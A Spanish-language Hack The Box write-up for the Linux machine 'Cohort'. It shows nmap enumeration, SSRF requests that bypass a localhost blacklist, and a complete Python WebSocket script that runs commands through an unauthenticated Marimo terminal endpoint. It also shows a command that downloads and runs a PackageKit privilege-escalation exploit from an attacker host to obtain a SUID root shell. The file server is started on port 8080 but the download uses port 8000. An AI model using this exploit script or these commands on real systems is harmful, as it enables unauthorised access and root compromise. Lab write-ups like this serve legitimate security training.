Markdown
---
title: "Cohort - Hack The Box"
platform: "HackTheBox"
os: "Linux"
difficulty: "easy"
date: 2026-06-18
tags: ["SSRF", "WebSockets", "CVE-2026-39987", "PackageKit", "PrivEsc"]
draft: false
---

## 1. Reconocimiento y Enumeración Inicial

Comenzamos realizando un escaneo de puertos mediante `nmap` para identificar los servicios expuestos en la máquina objetivo (`10.129.119.9`):

```bash
nmap -v -p- --open -T4 -sS -n -oX escaneo.xml 10.129.119.9
El escaneo revela los siguientes puertos abiertos:

22/tcp - SSH

80/tcp - HTTP

443/tcp - HTTPS

Posteriormente, ejecutamos un escaneo exhaustivo de scripts de enumeración y detección de versiones:

Bash
nmap -sV -sC -p22,80,443 10.129.119.9
Dado que el servicio web responde bajo un dominio virtual, añadimos la resolución estática al archivo /etc/hosts:

Bash
echo "10.129.119.9 cohort.htb" | sudo tee -a /etc/hosts
2. Enumeración Web y Hallazgo de SSRF
Al interactuar con la aplicación web e interceptar el tráfico en la pestaña de red, se observa el envío de una URL de prueba a través de un formulario con la siguiente estructura de solicitud:

HTTP
POST /api/validate HTTP/1.1
Host: cohort.htb
Content-Type: application/json

{ "url": "[http://test.com/log.csv](http://test.com/log.csv)", "format": "csv" }
El endpoint procesa un cuerpo JSON con los parámetros url y format, realizando peticiones desde el lado del servidor hacia el recurso especificado.

Análisis del mecanismo de filtrado
Se identifica un filtro que rechaza explícitamente direcciones locales o de bucle invertido devolviendo un mensaje de error ("no permitido"). Esto denota una validación basada en listas de bloqueo (blacklist) de cadenas literales (127.0.0.1 o localhost). Podemos eludirlo utilizando representaciones alternativas de la interfaz loopback.

Probamos el primer vector de evasión mediante curl:

Bash
curl -s -k -X POST [https://cohort.htb/api/validate](https://cohort.htb/api/validate) \
  -H "Content-Type: application/json" \
  -d '{"url": "[http://127.1/](http://127.1/)", "format": "csv"}'
Respuesta obtenida:

JSON
{"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": "<doctype html> ... <title>Cohort Analytics</title> ...", "message": "Source reachable."}
La validación es exitosa, confirmando la existencia de una vulnerabilidad de Server-Side Request Forgery (SSRF).

3. Explotación de SSRF y Descubrimiento de Servicios Internos
Una vez confirmado el SSRF, procedemos a enumerar servicios internos expuestos localmente:

Exploración del puerto 5000
Bash
curl -s -k -X POST [https://cohort.htb/api/validate](https://cohort.htb/api/validate) \
  -H "Content-Type: application/json" \
  -d '{"url": "[http://127.1:5000/](http://127.1:5000/)", "format": "csv"}'
Respuesta: { "ok": true, "fetched_status": 405, ... "message": "Método no permitido." } (Corresponde al backend de la propia API, que rechaza peticiones GET directas).

Exploración del puerto 8888
Bash
curl -s -k -X POST [https://cohort.htb/api/validate](https://cohort.htb/api/validate) \
  -H "Content-Type: application/json" \
  -d '{"url": "[http://127.1:8888/](http://127.1:8888/)", "format": "csv"}'
Respuesta: La aplicación responde con un título que apunta a Marimo (<title>marimo</title>), un entorno de cuadernos interactivos en Python protegido por un panel de autenticación.

Fuzzing y Exposición de Configuración de Nginx (/status)
Revisando los directorios, detectamos que /status devuelve un error 403 Forbidden. Lo consultamos mediante el SSRF:

Bash
curl -s -k -X POST [https://cohort.htb/api/validate](https://cohort.htb/api/validate) \
  -H "Content-Type: application/json" \
  -d '{"url": "[http://127.1/status](http://127.1/status)", "format": "csv"}'
Respuesta estructurada (JSON):

JSON
{ 
  "service": "cohort-edge", 
  "status": "ok", 
  "generated_by": "nginx", 
  "upstreams": [ 
    { "name": "marketing", "host": "cohort.htb", "root": "/var/www/cohort" }, 
    { "name": "insights-api", "host": "cohort.htb", "path": "/api/", "target": "127.0.0.1:5000" }, 
    { "name": "notebooks", "host": "nb-1be3782a8afd3ad5.cohort.htb", "target": "127.0.0.1:8888", "note": "espacio de trabajo interno para analistas" } 
  ] 
}
La respuesta revela un Virtual Host interno oculto: nb-1be3782a8afd3ad5.cohort.htb. Lo añadimos a nuestro /etc/hosts:

Bash
echo "10.129.119.9 nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
4. Explotación de Marimo (CVE-2026-39987)
Al acceder al subdominio descubierto, identificamos el CVE-2026-39987, una falla de omisión de autenticación previa donde la función validate_auth() no controla el acceso en el endpoint de WebSockets (/terminal/ws), permitiendo a cualquier cliente interactuar directamente con la consola sin credenciales.

Script de Explotación de WebSocket
Desarrollamos el script en Python para interactuar con el WebSocket y ejecutar comandos:

Python
import socket, ssl, base64, os, struct, time, select 

TARGET_IP = "10.129.119.9" 
HOST = "nb-1be3782a8afd3ad5.cohort.htb" 
PATH = "/terminal/ws"

def connect(): 
    raw = socket.create_connection((TARGET_IP, 443), timeout=5) 
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) 
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(raw, server_hostname=HOST) 
    key = base64.b64encode(os.urandom(16)).decode() 
    req = (f"GET {PATH} HTTP/1.1\r\nHost: {HOST}\r\nUpgrade: websocket\r\n"
           f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
           f"Sec-WebSocket-Version: 13\r\nOrigin: https://{HOST}\r\n\r\n") 
    s.sendall(req.encode()) 
    s.settimeout(5) 
    resp = b"" 
    while b"\r\n\r\n" not in resp: 
        resp += s.recv(4096) 
    return s 

def send_text(s, text): 
    payload = text.encode() 
    mask = os.urandom(4) 
    masked = bytes(b ^ mask[i % 4] for i, b in enumerate(payload)) 
    length = len(payload) 
    header = struct.pack("!BB", 0x81, 0x80 | length) if length <= 125 else struct.pack("!BBH", 0x81, 0x80 | 126, length)
    s.sendall(header + mask + masked) 

def recv_frames(s, duration=3): 
    end = time.time() + duration 
    buf = b"" 
    while time.time() < end: 
        r, _, _ = select.select([s], [], [], 0.5) 
        if r: 
            try: chunk = s.recv(4096) 
            except (socket.timeout, ssl.SSLWantReadError): continue 
            if not chunk: break
            buf += chunk 
    return buf

if __name__ == "__main__": 
    import sys 
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id; whoami; hostname"
    s = connect() 
    send_text(s, cmd + "\r") 
    print(recv_frames(s, 4).decode(errors="replace"))
Ejecutamos el script para verificar el acceso y leer la flag de usuario (user.txt):

Bash
python3 marimo_exploit.py "cat /home/marimo/user.txt"
5. Escalada de Privilegios: Pack2TheRoot (CVE-2026-41651)
Auditando los paquetes instalados en el sistema mediante el gestor de paquetes, observamos la versión vulnerable de PackageKit:

Bash
python3 marimo_exploit.py "dpkg -l | grep -i packagekit; which dpkg-deb; dbus-send --version"
Las versiones comprendidas entre la 1.0.2 y la 1.3.4 son vulnerables a CVE-2026-41651, conocida como "Pack2TheRoot".

Metodología de Explotación:
Transferencia del exploit: Levantamos un servidor HTTP temporal en nuestra máquina:

Bash
python3 -m http.server 8080
Y lo descargamos en la víctima:

Bash
python3 marimo_exploit.py "curl -s -o /tmp/exploit.bin http://<IP_ATACANTE>:8000/exploit.bin && chmod +x /tmp/exploit.bin"
Ejecución en segundo plano (Race Condition):

Bash
python3 marimo_exploit.py "rm -f /tmp/.suid_bash /tmp/pk.log; nohup /tmp/exploit.bin > /tmp/pk.log 2>&1 & sleep 1; echo iniciado"
Verificación y obtención de privilegios:

Bash
python3 marimo_exploit.py "stat /tmp/.suid_bash"
Invocamos la bash con privilegios de root para leer la flag definitiva (root.txt):

Bash
/tmp/.suid_bash -p
cat /root/root.txt
¡Sistema comprometido por completo!